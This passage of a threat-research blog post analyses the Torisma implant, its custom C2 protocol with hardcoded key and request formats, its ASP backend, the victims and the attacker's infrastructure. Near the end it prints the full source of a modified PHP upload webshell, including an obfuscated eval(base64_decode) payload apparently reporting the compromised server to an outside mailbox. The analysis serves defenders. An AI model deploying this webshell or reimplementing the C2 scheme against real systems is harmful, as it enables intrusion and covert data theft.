<p><img class="aligncenter size-full wp-image-108232" src="/wp-content/uploads/2020/10/monitoring.png" alt="" width="627" height="544" srcset="/wp-content/uploads/2020/10/monitoring.png 627w, /wp-content/uploads/2020/10/monitoring-300x260.png 300w, /wp-content/uploads/2020/10/monitoring-149x129.png 149w" sizes="(max-width: 627px) 100vw, 627px" /></p>
<p style="text-align: center;">Monitoring loop</p>
<ol start="2">
<li>It will monitor for an increase in the number of logical drives and Remote Desktop Sessions (RDS). If either occur, a status code will be set (5. New drive, 6. New RDS session) and the monitoring loop stops.</li>
</ol>
<p><em>Drive tracking</em></p>
<p style="padding-left: 80px;">a. It uses GetlogicalDrives to get a bitmask of all the drives available on the system, then iterates over each possible drive letter</p>
<p style="padding-left: 80px;">b. It will also use GetDriveType to make sure the new drive is not a CD-ROM drive</p>
<p><img class="aligncenter size-full wp-image-108235" src="/wp-content/uploads/2020/10/check-drive-type.png" alt="" width="685" height="480" srcset="/wp-content/uploads/2020/10/check-drive-type.png 685w, /wp-content/uploads/2020/10/check-drive-type-300x210.png 300w, /wp-content/uploads/2020/10/check-drive-type-184x129.png 184w" sizes="(max-width: 685px) 100vw, 685px" /></p>
<p style="text-align: center;">Check drive type</p>
<ol start="3">
<li>It keeps track of the number of drives previously seen and will return 1 if the number has increased</li>
</ol>
<p><strong><em>RDP Session Tracking</em></strong></p>
<p>The RDP session tracking function operates the same as the drive tracking. If the number increases by one it then returns 1. It uses WTSEnumerateSessionsW to get a list of sessions, iterates through them to count active ones.</p>
<p><img class="aligncenter size-full wp-image-108238" src="/wp-content/uploads/2020/10/RDP-sessions.png" alt="" width="700" height="402" srcset="/wp-content/uploads/2020/10/RDP-sessions.png 700w, /wp-content/uploads/2020/10/RDP-sessions-300x172.png 300w, /wp-content/uploads/2020/10/RDP-sessions-205x118.png 205w" sizes="(max-width: 700px) 100vw, 700px" /></p>
<p style="text-align: center;">Get active RDP sessions</p>
<p><img class="aligncenter size-full wp-image-108241" src="/wp-content/uploads/2020/10/RDP-sessions-2.png" alt="" width="700" height="423" srcset="/wp-content/uploads/2020/10/RDP-sessions-2.png 700w, /wp-content/uploads/2020/10/RDP-sessions-2-300x181.png 300w, /wp-content/uploads/2020/10/RDP-sessions-2-205x124.png 205w" sizes="(max-width: 700px) 100vw, 700px" /></p>
<p style="text-align: center;">Get active RDP sessions, continued</p>
<h3>Command and Control Communication</h3>
<p>The C2 code is interesting and is a custom implementation. The general process for this protocol is as follows.</p>
<ol>
<li>Generates a connection ID that will be kept throughout this step as a hex string of five random bytes for each module (0x63) and random seeded with the output of GetTickCount64</li>
</ol>
<p><img class="aligncenter size-full wp-image-108244" src="/wp-content/uploads/2020/10/connection-ID.png" alt="" width="251" height="503" srcset="/wp-content/uploads/2020/10/connection-ID.png 251w, /wp-content/uploads/2020/10/connection-ID-150x300.png 150w, /wp-content/uploads/2020/10/connection-ID-64x129.png 64w" sizes="(max-width: 251px) 100vw, 251px" /></p>
<p style="text-align: center;">Generate connection ID</p>
<ol start="2">
<li>Next it loads a destination URL
<ol start="2">a. There are three available servers hardcoded in the implant as an encrypted blob</ol>
<ol start="2">
<li style="list-style-type: none;">b. The decryption is done using a VEST-32 encryption algorithm with the hardcoded key ff7172d9c888b7a88a7d77372112d772</li>
</ol>
</li>
</ol>
<p><img class="aligncenter size-full wp-image-108247" src="/wp-content/uploads/2020/10/decryption.png" alt="" width="357" height="660" srcset="/wp-content/uploads/2020/10/decryption.png 357w, /wp-content/uploads/2020/10/decryption-162x300.png 162w, /wp-content/uploads/2020/10/decryption-70x129.png 70w" sizes="(max-width: 357px) 100vw, 357px" /></p>
<p style="text-align: center;">Configuration Decryption</p>
<p style="padding-left: 80px;">c. A random configuration number is picked (mod 6) to select this configuration</p>
<p style="padding-left: 80px;">d. There are only 3 configurations available, if the configuration number picked is above 3, it will keep incrementing (mod 6) until one is picked. Configuration 0 is more likely to be chosen because of this process.</p>
<p><img class="aligncenter size-full wp-image-108250" src="/wp-content/uploads/2020/10/pick-configurations.png" alt="" width="667" height="400" srcset="/wp-content/uploads/2020/10/pick-configurations.png 667w, /wp-content/uploads/2020/10/pick-configurations-300x180.png 300w, /wp-content/uploads/2020/10/pick-configurations-205x123.png 205w" sizes="(max-width: 667px) 100vw, 667px" /></p>
<p style="text-align: center;">Code to pick configurations</p>
<ol start="3">
<li>It will send a POST request to the URL it retrieved from the configuration with a “VIEW” action. It builds a request using the following hardcoded format string.</li>
</ol>
<table>
<tbody>
<tr>
<td width="623">post =&gt; ACTION=VIEW&amp;PAGE=%s&amp;CODE=%s&amp;CACHE=%s&amp;REQUEST=%d</p>
<p>=&gt; PAGE=drive_count</p>
<p>CODE=RDS_session_count</p>
<p>CACHE=base64(blob)</p>
<p>Request=Rand()</p>
<p>&nbsp;</p>
<p>blob: size 0x43c</p>
<p>blob[0x434:0x438] = status_code</p>
<p>blob[0x438:0x43c] = 1</p>
<p>blob[0:0x400] = form_url</p>
<p>blob[0x400:0x418] = mac_address</p>
<p>blob[0x418:0x424] = connection_id (random)</p>
<p>blob[0x424:0x434] = &#8220;MC0921&#8221; (UTF-16LE)</td>
</tr>
</tbody>
</table>
<p style="padding-left: 80px;">a. The process will be looking for the return of the string <strong>Your request has been accepted. ClientID: {f9102bc8a7d81ef01ba}</strong> to indicate success</p>
<ol start="4">
<li>If successful, it will retrieve data from the C2 via a POST request, this time it will use the PREVPAGE action</li>
</ol>
<p style="padding-left: 80px;">a. It uses the following format string for the POST request</p>
<table>
<tbody>
<tr>
<td width="623">ACTION=PREVPAGE&amp;CODE=C%s&amp;RES=%d</p>
<p>With: CODE = connection_id (from before)</p>
<p>RES = Rand()</td>
</tr>
</tbody>
</table>
<p style="padding-left: 80px;">b. The reply received from the server is encrypted it. To decrypt it the following process is needed</p>
<p style="padding-left: 120px;">i. Replace space with +</p>
<p style="padding-left: 120px;">ii. Base64 decode the result</p>
<p style="padding-left: 120px;">iii. Decrypt the data with key &#8220;ff7172d9c888b7a88a7d77372112d772&#8221;</p>
<p><img class="aligncenter size-full wp-image-108253" src="/wp-content/uploads/2020/10/server-decryption.png" alt="" width="206" height="467" srcset="/wp-content/uploads/2020/10/server-decryption.png 206w, /wp-content/uploads/2020/10/server-decryption-132x300.png 132w, /wp-content/uploads/2020/10/server-decryption-57x129.png 57w" sizes="(max-width: 206px) 100vw, 206px" /></p>
<p style="text-align: center;">Server decryption using key</p>
<p style="padding-left: 120px;">iv. Perform a XOR on the data</p>
<p><img class="aligncenter size-full wp-image-108256" src="/wp-content/uploads/2020/10/XOR.png" alt="" width="429" height="449" srcset="/wp-content/uploads/2020/10/XOR.png 429w, /wp-content/uploads/2020/10/XOR-287x300.png 287w, /wp-content/uploads/2020/10/XOR-123x129.png 123w, /wp-content/uploads/2020/10/XOR-24x24.png 24w" sizes="(max-width: 429px) 100vw, 429px" /></p>
<p style="text-align: center;">Perform XOR on the data</p>
<ol start="7">
<li style="list-style-type: none;">
<ol start="7">
<li>The decrypted data is going to be used to execute a shellcode from the server and send data back</li>
</ol>
</li>
</ol>
<p style="padding-left: 120px;">a. Data from the server will be split into a payload to execute and the data passed as an argument that is being passed to it<br />
b. Part of the data blob sent from the server is used to update the local configuration used for monitoring</p>
<p style="padding-left: 160px;">i. The first 8 bytes are fed to a add+xor loop to generate a transformed version that s compared to hardcoded values</p>
<p><img class="aligncenter size-full wp-image-108259" src="/wp-content/uploads/2020/10/configuration-check.png" alt="" width="628" height="302" srcset="/wp-content/uploads/2020/10/configuration-check.png 628w, /wp-content/uploads/2020/10/configuration-check-300x144.png 300w, /wp-content/uploads/2020/10/configuration-check-205x99.png 205w" sizes="(max-width: 628px) 100vw, 628px" /></p>
<p style="text-align: center;">Configuration check</p>
<p><img class="aligncenter size-full wp-image-108262" src="/wp-content/uploads/2020/10/configuration-check-2.png" alt="" width="627" height="391" srcset="/wp-content/uploads/2020/10/configuration-check-2.png 627w, /wp-content/uploads/2020/10/configuration-check-2-300x187.png 300w, /wp-content/uploads/2020/10/configuration-check-2-205x129.png 205w" sizes="(max-width: 627px) 100vw, 627px" /></p>
<p style="text-align: center;">Configuration check continued</p>
<p style="padding-left: 120px;">ii. If the transformed data matched either of the two hardcoded values, the local configuration is updated</p>
<p style="padding-left: 120px;">iii. In addition, the duration of the observation (for the Drive/RDS) loop can be updated by the server</p>
<p style="padding-left: 120px;">iv. If the duration is above 0x7620 (21 days) it will then re-enable the monitoring even if the configuration detailed above had disabled it</p>
<p style="padding-left: 120px;">v. If the transformed data doesn’t match any of the two hardcoded values, then monitoring will be disabled by the configuration</p>
<p style="padding-left: 80px;">c. The implant will create a new communication thread and will wait until its notified to continue. It will then proceed to execute the shellcode and then wait for the other thread to terminate.</p>
<p style="padding-left: 80px;">d. Depending on what occurred (an error occurred, or monitoring is enabled/disabled) the code will return a magic value that will decide if the code needs to run again or return to the monitoring process.</p>
<p><img class="aligncenter size-full wp-image-108265" src="/wp-content/uploads/2020/10/return-to-loop.png" alt="" width="627" height="295" srcset="/wp-content/uploads/2020/10/return-to-loop.png 627w, /wp-content/uploads/2020/10/return-to-loop-300x141.png 300w, /wp-content/uploads/2020/10/return-to-loop-205x96.png 205w" sizes="(max-width: 627px) 100vw, 627px" /></p>
<p style="text-align: center;">Return to communications loop</p>
<ol start="8">
<li style="list-style-type: none;">
<ol start="8">
<li>The communications thread will create a new named pipe (intended to communicate with the shellcode). It the notifies the other thread once the pipe is ready and then proceed to send data read from the pipe to the server.</li>
</ol>
</li>
</ol>
<p style="padding-left: 120px;">a. The pipe name is \\.\pipe\fb4d1181bb09b484d058768598b</p>
<p><img class="aligncenter size-full wp-image-108268" src="/wp-content/uploads/2020/10/pipe.png" alt="" width="372" height="327" srcset="/wp-content/uploads/2020/10/pipe.png 372w, /wp-content/uploads/2020/10/pipe-300x264.png 300w, /wp-content/uploads/2020/10/pipe-147x129.png 147w" sizes="(max-width: 372px) 100vw, 372px" /></p>
<p style="text-align: center;">Code for named pipe</p>
<p style="padding-left: 120px;">b. It will read data from the pipe (and flag the processing as completed if it finds &#8220;- &#8211; &#8211; &#8211; &#8211; &#8211; &#8211; &#8211; -&#8220;</p>
<p style="padding-left: 120px;">c. It will then send the data read back to the C2 by sending a POST in the following format</p>
<table>
<tbody>
<tr>
<td width="623">ACTION=NEXTPAGE</p>
<p>ACTION=NEXTPAGE&amp;CODE=S%s&amp;CACHE=%s&amp;RES=%d</p>
<p>CODE=connection_id</p>
<p>CACHE=base64(message)</p>
<p>RES = Rand()</td>
</tr>
</tbody>
</table>
<p style="padding-left: 120px;">d. Data is encrypted following the same pattern as before, data is first XORED and then encrypted using VEST-32 with the same key as before</p>
<p style="padding-left: 120px;">e. This will be repeated until the payload thread sends the “- &#8211; &#8211; &#8211; &#8211; &#8211; &#8211; &#8211; -“message or that the post failed</p>
<h3>Campaign Identification</h3>
<p>One way the adversary keeps track of what victims are infected by what version of the first stage implant is by using campaign IDs. These IDs are hard coded into the VB macro of the template document files that are retrieved by the first stage maldoc.</p>
<p>They are sent to the backend server through the NED parameter as covered earlier, further they are read and interpreted by the ASP code.</p>
<p><img class="aligncenter size-full wp-image-108271" src="/wp-content/uploads/2020/10/ASP.png" alt="" width="542" height="322" srcset="/wp-content/uploads/2020/10/ASP.png 542w, /wp-content/uploads/2020/10/ASP-300x178.png 300w, /wp-content/uploads/2020/10/ASP-205x122.png 205w" sizes="(max-width: 542px) 100vw, 542px" /></p>
<p><strong>Victimology</strong></p>
<p>According to the raw access logs for Inc-Controller-News.asp it is possible to understand what countries were impacted and it matches with the logs we discovered along another .asp page (view.asp), which we will explain later in the document.</p>
<p><img class="aligncenter size-full wp-image-108190" src="/wp-content/uploads/2020/10/global-victims.png" alt="" width="1007" height="609" srcset="/wp-content/uploads/2020/10/global-victims.png 1007w, /wp-content/uploads/2020/10/global-victims-300x181.png 300w, /wp-content/uploads/2020/10/global-victims-768x464.png 768w, /wp-content/uploads/2020/10/global-victims-205x124.png 205w" sizes="(max-width: 1007px) 100vw, 1007px" /></p>
<p>Based on one of C2 log files we could identify the following about the victims:</p>
<ul>
<li>Russian defense contractor</li>
<li>Two IP addresses in two Israeli ISP address spaces</li>
<li>IP addresses in Australian ISP space</li>
<li>IP address in Russian ISP address space</li>
<li>India-based defense contractor</li>
</ul>
<p><strong>Template-letter.asp</strong></p>
<p>During our investigation we uncovered additional information that led to the discovery of additional ASP pages. One ASP page discovered on the same compromised command and control server contained interesting code. First this ASP page is encoded in the same method using VB.Encode as we observed with the code that delivers the Torisma implant. Second it appears that the code is part of the core backend managed by the attacker and had the original file name of board_list.asp. Based on in the wild submission data the file board_list.asp first appeared in Korea October 2017, this suggests that this code for this webshell has been in use since 2017.</p>
<p>Further, this ASP page is a custom webshell that according to our knowledge and sources is not an off-the-shelf common webshell, rather something specifically used in these attacks. Some of the actions include browsing files, executing commands, connecting to a database, etc. The attacker is presented with the login page and a default base64 encoded password of ‘venus’ can be used to login (this value is hardcoded in the source of this page).</p>
<p><img class="aligncenter size-full wp-image-108274" src="/wp-content/uploads/2020/10/template-letter.png" alt="" width="872" height="272" srcset="/wp-content/uploads/2020/10/template-letter.png 872w, /wp-content/uploads/2020/10/template-letter-300x94.png 300w, /wp-content/uploads/2020/10/template-letter-768x240.png 768w, /wp-content/uploads/2020/10/template-letter-205x64.png 205w" sizes="(max-width: 872px) 100vw, 872px" /></p>
<p style="text-align: center;">Template-Letter.ASP main page</p>
<p><img class="aligncenter size-full wp-image-108277" src="/wp-content/uploads/2020/10/execute-commands.png" alt="" width="883" height="118" srcset="/wp-content/uploads/2020/10/execute-commands.png 883w, /wp-content/uploads/2020/10/execute-commands-300x40.png 300w, /wp-content/uploads/2020/10/execute-commands-768x103.png 768w, /wp-content/uploads/2020/10/execute-commands-205x27.png 205w" sizes="(max-width: 883px) 100vw, 883px" /></p>
<p style="text-align: center;">Functionality to execute commands</p>
<p><strong> </strong><strong>VIEW.ASP -Torisma Backend</strong></p>
<p>The View.ASP file is equally important as the inc-controller-news.asp file and contains interesting functionality. This ASP page is the backend code for the Torisma implant, and the functions are intended to interact with the infected victim.</p>
<p>The view.asp file contains the following references in the code:</p>
<p><img class="aligncenter size-full wp-image-108280" src="/wp-content/uploads/2020/10/code.png" alt="" width="1422" height="414" srcset="/wp-content/uploads/2020/10/code.png 1422w, /wp-content/uploads/2020/10/code-300x87.png 300w, /wp-content/uploads/2020/10/code-1024x298.png 1024w, /wp-content/uploads/2020/10/code-768x224.png 768w, /wp-content/uploads/2020/10/code-205x60.png 205w" sizes="(max-width: 1422px) 100vw, 1422px" /></p>
<p>The file “FOUND001.CHK” contains a “logfile” as the CONST value name possibly refers to “logvault”.</p>
<p><img class="aligncenter size-full wp-image-108283" src="/wp-content/uploads/2020/10/logvault.png" alt="" width="1431" height="334" srcset="/wp-content/uploads/2020/10/logvault.png 1431w, /wp-content/uploads/2020/10/logvault-300x70.png 300w, /wp-content/uploads/2020/10/logvault-1024x239.png 1024w, /wp-content/uploads/2020/10/logvault-768x179.png 768w, /wp-content/uploads/2020/10/logvault-205x48.png 205w" sizes="(max-width: 1431px) 100vw, 1431px" /></p>
<p>Analyzing the possible victims revealed an interesting list:</p>
<ul>
<li>Russia-based defense contractor</li>
<li>Two IP addresses in two Israeli ISP address spaces</li>
<li>IP address in Russian ISP address space</li>
<li>India-based defense contractor</li>
</ul>
<p>The file “FOUND002.CHK” contains a Base64 string that decodes to:</p>
<p>hxxps://www.krnetworkcloud.org/blog/js/view.php|www.krnetworkcloud.org|2|/blog/js/view.php|NT</p>
<p>The above domain was likely compromised to host malicious code, given it belongs to an Indian IT training company.</p>
<p>The Const value name for “FOUND002.CHK” is “cfgvault”, the first three letters might refer to “configuration”. This ASP code contains additional functions that may indicate what role this page has in the overall scheme of things. View.asp is the Torisma implant backend code with numerous functions implemented to handle requests from the implant as described earlier in this analysis. Based on our analysis of both the Torisma implant and this backend code, some interesting insight has been discovered.  First implemented in the ASP code are the general actions that can be taken by this backend depending on the interaction with Torisma.</p>
<p>Some of these actions are triggered by the implant connecting and the others may be invoked by another process. The main ASP page is implemented to handle incoming requests based on a request ACTION with several possible options to call. Given that the implant is driven by the “ACTION” method when it comes to the C2 communication, a number of these cases could be selected. However, we only see code implemented in Torisma to call and handle the request/response mechanism for NEXTPAGE and PREVPAGE, thus these other actions are likely performed by the adversary through some other process.</p>
<p style="text-align: center;"><img class="aligncenter size-full wp-image-108286" src="/wp-content/uploads/2020/10/general-actions.png" alt="" width="623" height="207" srcset="/wp-content/uploads/2020/10/general-actions.png 623w, /wp-content/uploads/2020/10/general-actions-300x100.png 300w, /wp-content/uploads/2020/10/general-actions-205x68.png 205w" sizes="(max-width: 623px) 100vw, 623px" /></p>
<p style="text-align: center;">General actions by View.ASP</p>
<p><strong>ViewPrevPage</strong></p>
<p>As described in the analysis, the ViewPrevPage action is a function designed to handle incoming requests from Torisma to get data. The data sent to Torisma appears to be in the form of ~dmf files. This content for the ViewPrevPage action comes in the form of shellcode intended to be executed on the victim side according to the analysis of the implant itself.</p>
<p><img class="aligncenter size-full wp-image-108289" src="/wp-content/uploads/2020/10/view-prev-page.png" alt="" width="605" height="551" srcset="/wp-content/uploads/2020/10/view-prev-page.png 605w, /wp-content/uploads/2020/10/view-prev-page-300x273.png 300w, /wp-content/uploads/2020/10/view-prev-page-142x129.png 142w" sizes="(max-width: 605px) 100vw, 605px" /></p>
<p style="text-align: center;">ViewPrevPage function</p>
<p><strong>ViewNextPage</strong></p>
<p>Torisma uses this method to send data back to the C2 server read from the named pipe. This is the results of the execution of the shellcode on the victim’s system through the ViewPrevPage action and the results of this execution are sent and processed using this function.</p>
<p><img class="aligncenter size-full wp-image-108292" src="/wp-content/uploads/2020/10/C2.png" alt="" width="509" height="515" srcset="/wp-content/uploads/2020/10/C2.png 509w, /wp-content/uploads/2020/10/C2-297x300.png 297w, /wp-content/uploads/2020/10/C2-127x129.png 127w, /wp-content/uploads/2020/10/C2-24x24.png 24w, /wp-content/uploads/2020/10/C2-48x48.png 48w, /wp-content/uploads/2020/10/C2-96x96.png 96w" sizes="(max-width: 509px) 100vw, 509px" /></p>
<p style="text-align: center;">Implant sends data to C2</p>
<p><strong>ViewGallery</strong></p>
<p>There is no function in Torisma implemented to call this function directly, this is likely called from another administration tool, probably implemented in the upstream server. A static analysis of this method reveals that it is likely intended to retrieve log files in a base64 encoded format and write the response. Like the Torisma implant, there is a response string that is received by the calling component that indicates the log file had been retrieved successfully and that it should then delete the log file.</p>
<p><img class="aligncenter size-full wp-image-108295" src="/wp-content/uploads/2020/10/view-gallery.png" alt="" width="628" height="382" srcset="/wp-content/uploads/2020/10/view-gallery.png 628w, /wp-content/uploads/2020/10/view-gallery-300x182.png 300w, /wp-content/uploads/2020/10/view-gallery-205x125.png 205w" sizes="(max-width: 628px) 100vw, 628px" /></p>
<p style="text-align: center;">Retrieve and write log file content in base64 format (ViewGallery)</p>
<p><strong>ViewMons</strong></p>
<p>Another function also not used by Torisma is intended to set the local configuration file. It appears to use a different request method than ACTION; in this case it uses MAILTO. Based on insight gathered from Torisma, we can speculate this is related to configuration files that are used by the implant.</p>
<p><img class="aligncenter size-full wp-image-108298" src="/wp-content/uploads/2020/10/view-mons.png" alt="" width="334" height="279" srcset="/wp-content/uploads/2020/10/view-mons.png 334w, /wp-content/uploads/2020/10/view-mons-300x251.png 300w, /wp-content/uploads/2020/10/view-mons-154x129.png 154w" sizes="(max-width: 334px) 100vw, 334px" /></p>
<p style="text-align: center;">ViewMons function</p>
<p><strong>SendData</strong></p>
<p>This function is used in the RedirectToAdmin method exclusively and is the mechanism for sending data to the upstream C2. It depends on the GetConfig function that is based on the stored value in the cfgvault variable.</p>
<p style="text-align: center;"><img class="aligncenter size-full wp-image-108301" src="/wp-content/uploads/2020/10/send-data.png" alt="" width="628" height="190" srcset="/wp-content/uploads/2020/10/send-data.png 628w, /wp-content/uploads/2020/10/send-data-300x91.png 300w, /wp-content/uploads/2020/10/send-data-205x62.png 205w" sizes="(max-width: 628px) 100vw, 628px" /></p>
<p style="text-align: center;">Send Data</p>
<p><strong>RedirectToAdmin</strong></p>
<p>This function is used to redirect information from an infected victim to the master server upstream. This is an interesting function indicating additional infrastructure beyond the immediate C2 with which we observed Torisma communicating.</p>
<p><img class="aligncenter size-full wp-image-108304" src="/wp-content/uploads/2020/10/redirecttoadmin.png" alt="" width="653" height="84" srcset="/wp-content/uploads/2020/10/redirecttoadmin.png 653w, /wp-content/uploads/2020/10/redirecttoadmin-300x39.png 300w, /wp-content/uploads/2020/10/redirecttoadmin-205x26.png 205w" sizes="(max-width: 653px) 100vw, 653px" /></p>
<p style="text-align: center;">RedirectToAdmin</p>
<p><strong>WriteAgentLog</strong></p>
<p>As part of the process of tracking victim’s with Torisma, the ASP code has a function to write log files. These resulting log files indicate success for the execution of shellcode on victims running Torisma. This logging method captures the user agent and IP address associated with the victim being monitored. This function is called when the information is sent to the master server via the RedirectToAdmin method.</p>
<p><img class="aligncenter size-full wp-image-108307" src="/wp-content/uploads/2020/10/writeagentlog.png" alt="" width="662" height="221" srcset="/wp-content/uploads/2020/10/writeagentlog.png 662w, /wp-content/uploads/2020/10/writeagentlog-300x100.png 300w, /wp-content/uploads/2020/10/writeagentlog-205x68.png 205w" sizes="(max-width: 662px) 100vw, 662px" /></p>
<p>Analysis of the server logs indicates the following countries made connections to the View.ASP page in July 2020.</p>
<ul>
<li>India</li>
<li>Australia</li>
<li>Israel</li>
<li>Finland</li>
</ul>
<p><strong>Webshells</strong></p>
<p>During our analysis we were able to determine that in some instances the attacker used webshells to maintain access. Discovered on another compromised server by the same actor with the same type of code was a PHP Webshell known as Viper 1337 Uploader. Based on our analysis this is a modified variant of Viper 1337 Uploader.</p>
<table>
<tbody>
<tr>
<td width="1812">&lt;title&gt;Viper 1337 Uploader&lt;/title&gt;</p>
<p>&lt;?php</p>
<p>echo &#8216;&lt;form action=&#8221;&#8221; method=&#8221;post&#8221; enctype=&#8221;multipart/form-data&#8221; name=&#8221;uploader&#8221; id=&#8221;uploader&#8221;&gt;&#8217;;</p>
<p>echo &#8216;&lt;input type=&#8221;file&#8221; name=&#8221;file&#8221; size=&#8221;50&#8243;&gt;&lt;input name=&#8221;_upl&#8221; type=&#8221;submit&#8221; id=&#8221;_upl&#8221; value=&#8221;Upload&#8221;&gt;&lt;/form&gt;&#8217;;</p>
<p>if( $_POST[&#8216;_upl&#8217;] == &#8220;Upload&#8221; ) {</p>
<p>if(@copy($_FILES[&#8216;file&#8217;][&#8216;tmp_name&#8217;], $_FILES[&#8216;file&#8217;][&#8216;name&#8217;])) { echo &#8216;&lt;b&gt;Shell Uploaded ! :)&lt;b&gt;&lt;br&gt;&lt;br&gt;&#8217;; }</p>
<p>else { echo &#8216;&lt;b&gt;Not uploaded ! &lt;/b&gt;&lt;br&gt;&lt;br&gt;&#8217;; }</p>
<p>}</p>
<p>?&gt;</p>
<p>&lt;?php</p>
<p>eval(base64_decode(&#8216;JHR1anVhbm1haWwgPSAnS2VsdWFyZ2FIbWVpN0B5YW5kZXguY29tJzsKJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRwZXNhbl9hbGVydCA9ICJmaXggJHhfcGF0aCA6cCAqSVAgQWRkcmVzcyA6IFsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIjsKbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUiLCAkcGVzYW5fYWxlcnQsICJbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSIpOw==&#8217;));</p>
<p>?&gt;</td>
</tr>
</tbody>
</table>
<p>Some additional log file analysis reveals that a dotm file hosted with a. jpg extension was accessed by an Israeli IP address. This IP address likely belongs to a victim in Israel that executed the main DOCX. Based on the analysis of the user-agent string belonging to the Israel IP address Microsoft+Office+Existence+Discovery indicates that the dotm file in question was downloaded from within Microsoft Office (template injection).</p>
<p><strong>Attacker Source</strong></p>
<p>According to our analysis the attacker accessed and posted a malicious ASP script “template-letter.asp” from the IP address 104.194.220.87 on 7/9/2020.  Further research indicates that the attacker is originating from a service known as VPN Consumer in New York, NY.</p>
<p><img class="aligncenter size-full wp-image-108310" src="/wp-content/uploads/2020/10/log-file.png" alt="" width="690" height="124" srcset="/wp-content/uploads/2020/10/log-file.png 690w, /wp-content/uploads/2020/10/log-file-300x54.png 300w, /wp-content/uploads/2020/10/log-file-205x37.png 205w" sizes="(max-width: 690px) 100vw, 690px" /></p>
<p>Snipped from log file showing attacker IP 104.194.220.87</p>
<p>From the same logfiles, we observed the following User Agent String:</p>
<p>“Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+10.0;+Win64;+x64;+Trident/7.0;+.NET4.0C;+.NET4.0E;+ms-office;+MSOffice+16)”</p>
<p>Decoding the User Agent string we can make the following statement</p>
<p>The attacker is using a 64bit Windows 10 platform and Office 2016.</p>
<p>The Office version is the same as we observed in the creation of the Word-documents as described in our document analysis part of Operation NorthStar.</p>
<h3>Conclusion</h3>
<p>It is not very often that we have a chance of getting the C2 server code pages and associated logging in our possession for analysis. Where we started with our initial analysis of the first stage payloads, layer after layer we were able to decode and reveal, resulting in unique insights into this campaign.</p>
<p>Analysis of logfiles uncovered potential targets of which we were unaware following our first analysis of Operation North Star, including internet service providers and defense contractors based in Russia and India.</p>
<p>Our analysis reveals a previously unknown second stage implant known as Torisma which executes a custom shellcode, depending on specific victim profiles, to run custom actions. It also illustrates how the adversary used compromised domains in Italy and elsewhere, belonging to random organizations such as an auction house and printing company, to collect data on victim organizations in multiple countries during an operation that lasted nearly a year.</p>
<p>This campaign was interesting in that there was a particular list of targets of interest, and that list was verified before the decision was made to send a second implant, either 32 or 64 bits, for further and in-depth monitoring. Progress of the implants sent by the C2 was monitored and written in a log file that gave the adversary an overview of which victims were successfully infiltrated and could be monitored further.</p>
<p>Our findings ultimately provide a unique view into not only how the adversary executes his attacks but also how he evaluates and chooses to further exploit his victims.</p>
<p>Read our <a href="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/mcafee-defenders-blog-operation-north-star-campaign/" target="_blank" rel="noopener noreferrer">McAfee Defender’s blog</a> to learn more about how you can build an adaptable security architecture against the Operation North Star campaign.</p>
<p><em>Special thanks to Philippe Laulheret for his assistance in analysis</em></p>
<p>&nbsp;</p>
<p><a href="#_ftnref1" name="_ftn1">[1]</a> https://www.ecrypt.eu.org/stream/p2ciphers/vest/vest_p2.pdf</p>
<p><a href="#_ftnref2" name="_ftn2">[2]</a> https://www.ecrypt.eu.org/stream/vestp2.html</p>
        </div>
    </div>

    <div class="wrap-section">  
        <div class="container medium">
            <h3>About the Author</h3>
        </div>
    </div>

    <div class="wrap-section padding-small bg-light-gray author-container">  
        <div class="container medium"> 


                <div class="row">
                    <div class="col-sm-2 col-xs-4 text-center">
                        <a href="/blogs/author/christiaan-beek/"><img class="author" src="/wp-content/uploads/2019/02/20190117_McAfee_0340_Print_Christiaan-Beek-1-300x300.jpg" /></a>
                        <ul class="social-networks">
                <li><a href="https://twitter.com/ChristiaanBeek" rel="nofollow" target="_blank"><i class="symbol-twitter"></i><span>Twitter</span></a></li><li><a href="https://www.linkedin.com/in/christiaanbeek/" rel="nofollow" target="_blank"><i class="symbol-linkedin"></i><span>LinkedIn</span></a></li>                        </ul>
                    </div>
                    <div class="col-sm-10 col-xs-8">
                        <h3 class="red"><a href="/blogs/author/christiaan-beek/">Christiaan Beek</a></h3>
                        <p>Christiaan Beek, lead scientist &amp; sr. principal engineer is part of Mcafee’s Office of the CTO leading strategic threat intelligence research within Mcafee. He coordinates and leads passionately the research in advanced attacks, plays a key-role in cyberattack take-down operations and participates in the NoMoreRansom project. In previous roles, Beek was Director of Threat Intelligence ...</p>						
                        <a href="/blogs/author/christiaan-beek/" class="caret-link">Read more posts from Christiaan Beek </a>
                    </div>
                </div><br/>
                            
                <div class="row">
                    <div class="col-sm-2 col-xs-4 text-center">
                        <a href="/blogs/author/ryan-sherstobitoff/"><img class="author" src="/wp-content/uploads/2018/07/Ryan.jpg" /></a>
                        <ul class="social-networks">
                <li><a href="https://twitter.com/r_sherstobitoff" rel="nofollow" target="_blank"><i class="symbol-twitter"></i><span>Twitter</span></a></li><li><a href="https://www.linkedin.com/in/ryan-sherstobitoff-a1334a5/" rel="nofollow" target="_blank"><i class="symbol-linkedin"></i><span>LinkedIn</span></a></li>                        </ul>
                    </div>
                    <div class="col-sm-10 col-xs-8">
                        <h3 class="red"><a href="/blogs/author/ryan-sherstobitoff/">Ryan Sherstobitoff</a></h3>
                        <p>Ryan Sherstobitoff is a Senior Analyst for Major Campaigns – Advanced Threat Research in McAfee. Ryan specializes in threat intelligence in the Asia Pacific Region where he conducts cutting edge research into new adversarial techniques and adapts those to better monitor the threat landscape. He formerly was the Chief Corporate Evangelist at Panda Security, where ...</p>						
                        <a href="/blogs/author/ryan-sherstobitoff/" class="caret-link">Read more posts from Ryan Sherstobitoff </a>
                    </div>
                </div><br/>
                                    </div>
    </div>

    <div class="wrap-section padding-top-xs">  
        <div class="container medium"> 
            <div class="row">
                            <div class="col-sm-6 col-xs-6">
            <a href="/blogs/other-blogs/mcafee-labs/operation-north-star-summary-of-our-latest-analysis/" rel="prev"><i class="fa fa-angle-left" aria-hidden="true"></i> Previous Article</a> 
                </div>
                <div class="col-sm-6 col-xs-6 text-right">
<a href="/blogs/other-blogs/life-at-mcafee/one-team-member-selflessly-provides-relief-to-covid-19s-front-line/" rel="next">Next Article <i class="fa fa-angle-right" aria-hidden="true"></i></a>                </div>
            </div>
        </div>
    </div>
